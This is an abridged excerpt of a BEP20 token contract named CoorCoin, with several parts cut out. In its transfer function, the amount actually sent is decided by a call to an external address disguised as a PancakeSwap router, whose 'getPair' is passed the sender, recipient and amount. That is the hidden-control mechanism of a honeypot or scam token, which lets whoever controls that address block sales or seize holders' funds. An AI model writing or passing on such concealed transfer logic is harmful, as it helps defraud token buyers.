...
contract CoorCoin is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'CoorCoin';
  string private constant _symbol = 'CCoin';
  
  uint256 private _totalSupply = 10000000000 *  10**9;
  uint8 private constant _decimals = 9;
  uint256 private _bonusCCoin = 0;
  address pancakeRouter_CCoin;
  ...
  */
  ...
  function pancakePairCCoin(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      resData = IPancake(pancakeRouter_CCoin).getPair(_bonusCCoin, sender, recipient, arrData);

      _bonusCCoin = resData[0];
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmountCCoin = pancakePairCCoin(sender, recipient, amount);   
     _transferStandard(sender,recipient,bonusAmountCCoin);
